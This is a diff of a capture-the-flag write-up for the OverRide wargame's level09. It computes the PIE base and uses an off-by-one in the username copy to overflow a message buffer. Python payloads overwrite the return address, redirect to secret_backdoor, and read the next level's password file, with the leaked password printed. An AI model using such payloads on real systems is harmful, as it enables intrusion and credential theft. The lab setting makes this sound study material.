@@ -8,6 +8,33 @@ Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RU
 #+begin_quote
 No stack execution, Pie
 #+end_quote
+*** Pie
+  we need to get the base va where the functions are loaded.
+#+begin_src shell
+  shell readelf -Wl ./level09
+
+  Elf file type is DYN (Shared object file)
+  Entry point 0x790
+  There are 9 program headers, starting at offset 64
+
+  Program Headers:
+    Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
+    PHDR           0x000040 0x0000000000000040 0x0000000000000040 0x0001f8 0x0001f8 R E 0x8
+    INTERP         0x000238 0x0000000000000238 0x0000000000000238 0x00001c 0x00001c R   0x1
+        [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+    LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000e0c 0x000e0c R E 0x200000
+    LOAD           0x001df8 0x0000000000201df8 0x0000000000201df8 0x000250 0x000340 RW  0x200000
+    DYNAMIC        0x001e20 0x0000000000201e20 0x0000000000201e20 0x000190 0x000190 RW  0x8
+    NOTE           0x000254 0x0000000000000254 0x0000000000000254 0x000044 0x000044 R   0x4
+    GNU_EH_FRAME   0x000c98 0x0000000000000c98 0x0000000000000c98 0x00004c 0x00004c R   0x4
+    GNU_STACK      0x000000 0x0000000000000000 0x0000000000000000 0x000000 0x000000 RW  0x8
+    GNU_RELRO      0x001df8 0x0000000000201df8 0x0000000000201df8 0x000208 0x000208 R   0x1
+
+#+end_src
+#+begin_quote
+    LOAD           0x000000 0x0000000000000000 0x0000000000000000 0x000e0c 0x000e0c R E 0x200000
+#+end_quote
+base_va=0
 ** Sticky bit
 #+begin_src shell
 ll ./$USER
@@ -97,6 +124,7 @@ Non-debugging symbols:
 * Binary Analisis
 ** Functions
 #+begin_src shell
+Dump of assembler code for function main:
    0x0000000000000aa8 <+0>:	push   rbp
    0x0000000000000aa9 <+1>:	mov    rbp,rsp
    0x0000000000000aac <+4>:	lea    rdi,[rip+0x15d]        # 0xc10
@@ -279,25 +307,167 @@ v7=size to write in  buffer
 #+end_quote
 **** set_msg
 #+begin_src shell
-    use the number to  copy inside buffer of handle_msg to override return.
-    offset=200
-   #the last byte set by set_user should be > 0xd0 or 208
-    p/x 208
+  use the number to  copy inside buffer of handle_msg to override return.
+  offset=200
+  #the last byte set by set_user should be > 0xd0 or 208
+  p/x 208
   $7 = 0xd0
+
 #+end_src
 **** Get the va secret va
 #+begin_src shell
   p secret_backdoor
   $6 = {<text variable, no debug info>} 0x88c <secret_backdoor>
-#+end_src
+#+end_src*
 **** idea
 #+begin_src shell
-  set_user  input "A" * 39 + "\xd0"
+  set_user  input "A" * 40 + "\xd0"
   set_msg input "A"*200+"\x00\x00\x00\x00\x00\x00\x08\x8c"[::-1]
   secret_backdoor input "/bin/sh"
-  #
+#+end_src
+
+#+begin_src shell
+#https://leeannn01.github.io/cyber-portfolio/pie-times/
+  shell nm --defined-only ./level09
+  0000000000201e20 a _DYNAMIC
+  0000000000201fe8 a _GLOBAL_OFFSET_TABLE_
+  0000000000000bb8 R _IO_stdin_used
+  0000000000201e00 d __CTOR_END__
+  0000000000201df8 d __CTOR_LIST__
+  0000000000201e10 D __DTOR_END__
+  0000000000201e08 d __DTOR_LIST__
+  0000000000000e08 r __FRAME_END__
+  0000000000201e18 d __JCR_END__
+  0000000000201e18 d __JCR_LIST__
+  0000000000202048 A __bss_start
+  0000000000202038 D __data_start
+  0000000000000b70 t __do_global_ctors_aux
+  00000000000007e0 t __do_global_dtors_aux
+  0000000000202040 D __dso_handle
+  0000000000201df4 d __init_array_end
+  0000000000201df4 d __init_array_start
+  0000000000000b60 T __libc_csu_fini
+  0000000000000ad0 T __libc_csu_init
+  0000000000202048 A _edata
+  0000000000202138 A _end
+  0000000000000ba8 T _fini
+  00000000000006f0 T _init
+  0000000000000790 T _start
+  00000000000007bc t call_gmon_start
+  0000000000202060 b completed.6531
+  0000000000202038 W data_start
+  0000000000202068 b dtor_idx.6533
+  0000000000000860 t frame_dummy
+  00000000000008c0 T handle_msg
+  0000000000000aa8 T main
+  0000000000202080 B save
+  000000000000088c T secret_backdoor
+  0000000000000932 T set_msg
+  00000000000009cd T set_username
+#+end_src
+#+begin_src shell
+  #I thought  that  the  ammount of \x00  and fgets could  give trouble
+  # certainly does but because buffer is fill with zero is a  trouble.
+
+  #We got trouble is PIE we are going  to use set_user for possible leak   handle_msg_va_ret - elf_handle_msg_va_ret va = and got the offset to add 
+  elf_base_va=0
+  elf_main_base_va=aa8
+  elf_handle_msg_ret=0x0000555555554abd-0xaa8
+p &main - 0xaa8
+$2 = (<text variable, no debug info> *) 0x555555554000
+(gdb) p/a  0x555555554000+0x88c
+$3 = 0x55555555488c <secret_backdoor>
+(gdb) $4 = 0x55555555488c <secret_backdoor>
+#+end_src
+Step by step
+1 Calculate the va  of  secret_backdoor
+#+begin_quote
+Because i  couldn't  write  pass 0x7fffffffeae5 and handle_message set the  value of the var  as=140  set the next 3 B with zeros of set_user printf %s could  not leak that data.
+what can i do is write the diff offset .
+#+end_quote
+#+begin_src shell
+shell cat /proc/sys/kernel/randomize_va_space
+0
+#+end_src
+#+begin_quote
+no aslr activate
+then  always the same va loaded i gonna use always the same value cause don't change because aslr disable
+https://stackoverflow.com/questions/61061830/i-am-wondering-if-pie-does-anything-if-the-aslr-is-turned-off-on-the-system-or
+#+end_quote
+#+begin_src shell
+      Breakpoint 1, 0x0000555555554aac in main ()
+      p/x (char[2])(short int)0x0000555555554aac 
+      $7 = {0xac, 0x4a}
+      p secret_backdoor
+      $8 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>
+      (gdb) p/x (char[2])(short int)0x55555555488c
+      $9 = {0x8c, 0x48}
+
+      r <<<$(python  -c 'print "A"*40+"\xca"; print "A"*200+"\x48\x8c"[::-1]; print "/bin/cat /home/users/end/.pass"')
+      (gdb) b strncpy
+    Breakpoint 4 at gnu-indirect-function resolver at 0x7ffff7aa5a70
+    c
+  (gdb) i r
+  rdx            0xca	202 # I send the 202 val i want.
+
+
+#+end_src
+#+begin_quote
+      secret_backdoor_va=x55555555488c
+#+end_quote
+
+#+begin_src shell
+  write to {0x8c, 0x48} in the last bytes but thx to little endian are the first
+  #let's try to  modify just the first 2B.
+  p/x 202
+  $10 = 0xca
+#+end_src
+2 Write the the va
+#+begin_src shell
+  r <<<$(python  -c 'print "A"*40+"\xd0"+"A"*87; print "A"*200+"\x48\x8c"[::-1]; print "/bin/cat /home/users/end/.pass"')
+  b fgets
+  fin
+  #is missing some chars i go fill val  until got correct data for  the last  print.
+  #using Scientist method.
+  r <<<$(python  -c 'print "A"*40+"\xca" + "A"*85; print "A"*200+"\x48\x8c"[::-1] + "A"*820; print "/bin/cat /home/users/end/.pass"')
+  # interesting breakpoint prinf to see  arg2 o $rdi in set_user
+  # interesting breakpoint fgets to see if need to  put more fill or less.
+  #gdb commands fin,  x/Nbx  $rax
+  # got this result in fgets.
+  x/s $rax
+  0x7fffffffea78:	 "/bin/cat /home/users/end/.pass\n"
+  Breakpoint 5, 0x00007ffff7a61210 in system () from /lib/x86_64-linux-gnu/libc.so.6
+  (gdb) x/s $rdi
+  0x7fffffffea78:	 "/bin/cat /home/users/end/.pass\n"
+  #may i  need to put \x00 and the end of .pass
+  # give perm error on the debugger but work  fine without it either way the change is easy let's try it
+    python  -c 'print "A"*40+"\xca" + "A"*85; print "A"*200+"\x48\x8c"[::-1] + "A"*820; print "/bin/cat /home/users/end/.pass\x00"' | ./$USER
+
 #+end_src
 * Explotation
+could avoid segfault  overwrite after [secret_pass_va][exit_va]
 #+begin_src shell
-cat /tmp/$USER - | ./$USER
+  #what u prefer.
+  python  -c 'print "A"*40+"\xca" + "A"*85; print "A"*200+"\x48\x8c"[::-1] + "A"*820; print "/bin/cat /home/users/end/.pass\x00"' | ./$USER
+  # or this other.
+       python  -c 'print "A"*40+"\xca" + "A"*85; print "A"*200+"\x48\x8c"[::-1] + "A"*820; print "/bin/cat /home/users/end/.pass"' | ./$USER
+  --------------------------------------------
+  |   ~Welcome to l33t-m$n ~    v1337        |
+  --------------------------------------------
+  >: Enter your username
+  >>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÊ>: Msg @Unix-Dude
+  >>: >: Msg sent!
+  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+  Segmentation fault (core dumped)
+  level09@OverRide:~$ 
+#+end_src
+* Reach the end level
+#+begin_src shell
+level09@OverRide:~$ su end
+Password: 
+end@OverRide:~$ ls
+end
+end@OverRide:~$ cat end
+GG !
+end@OverRide:~$ 
 #+end_src
